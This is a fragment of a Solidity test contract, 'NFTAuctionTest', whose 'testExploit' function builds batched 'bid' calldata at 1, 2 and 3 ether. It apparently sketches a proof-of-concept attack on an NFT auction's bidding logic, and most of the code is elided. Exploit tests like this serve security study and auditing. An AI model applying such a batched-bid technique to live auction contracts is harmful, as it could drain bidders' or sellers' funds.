...
contract NFTAuctionTest is Test {
    ...
    function testExploit() public {
        ...
        _calldata[0] = abi.encodeWithSignature("bid(uint256,uint256)", tokenId, 1 ether);
        _calldata[1] = abi.encodeWithSignature("bid(uint256,uint256)", tokenId, 2 ether);
        ...
        _calldata[0] = abi.encodeWithSignature("bid(uint256,uint256)", tokenId, 3 ether);
        _calldata[1] = abi.encodeWithSignature("bid(uint256,uint256)", tokenId, 3 ether);
